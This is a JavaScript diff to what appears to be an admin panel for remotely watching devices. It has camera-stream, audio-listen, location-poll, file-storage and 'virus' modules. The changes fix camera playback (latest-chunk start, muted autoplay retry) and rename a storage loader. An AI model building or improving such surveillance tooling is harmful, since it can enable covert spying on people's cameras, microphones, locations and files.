@@ -166,7 +166,7 @@ function switchModule(mod) {
         stopCameraWatch();
         stopAudioListen();
         stopLocationPoll();
-        loadStorageFileList();
+        loadAdminStorageFiles();
     } else if (mod === 'virus') {
         content.innerHTML = renderModuleVirus();
         stopCameraWatch();
@@ -369,12 +369,16 @@ async function pollCameraStream() {
         if (resp.status === 401) { logout(); return; }
         const data = await resp.json();
         if (data.status === 'ok' && data.chunks && data.chunks.length > 0) {
+            if (cameraLastSeq === -1) {
+                cameraChunkQueue = [data.chunks[data.chunks.length - 1]];
+            } else {
+                for (const chunk of data.chunks) {
+                    cameraChunkQueue.push(chunk);
+                }
+            }
             cameraLastSeq = data.max_seq;
             const st = document.getElementById('cameraStatus');
             if (st) st.textContent = data.chunks.length + ' yeni kare';
-            for (const chunk of data.chunks) {
-                cameraChunkQueue.push(chunk);
-            }
             if (!cameraPlaying) playNextChunk();
         }
     } catch {}
@@ -415,7 +419,10 @@ function playNextChunk() {
         video.onended = () => playNextChunk();
         video.onerror = () => playNextChunk();
         video.src = url;
-        video.play().catch(() => playNextChunk());
+        video.play().catch(() => {
+            video.muted = true;
+            video.play().catch(() => playNextChunk());
+        });
 
         const st = document.getElementById('cameraStatus');
         if (st) st.textContent = 'Canli ' + new Date().toLocaleTimeString();
@@ -520,7 +527,10 @@ async function acceptWebRTCOffer(uid, offer) {
             const pl = document.getElementById('cameraPlaceholder');
             if (video && e.streams[0]) {
                 video.srcObject = e.streams[0];
-                video.play().catch(() => {});
+                video.play().catch(() => {
+                    video.muted = true;
+                    video.play().catch(() => {});
+                });
                 if (pl) pl.style.display = 'none';
             }
         };
@@ -1338,7 +1348,7 @@ function openInGoogleMaps() {
 }
 
 async function refreshStorageList() {
-    if (selectedUid) await loadStorageFileList();
+    if (selectedUid) loadAdminStorageFiles();
 }
 
 // ==================== NOTIFICATION BELL ====================
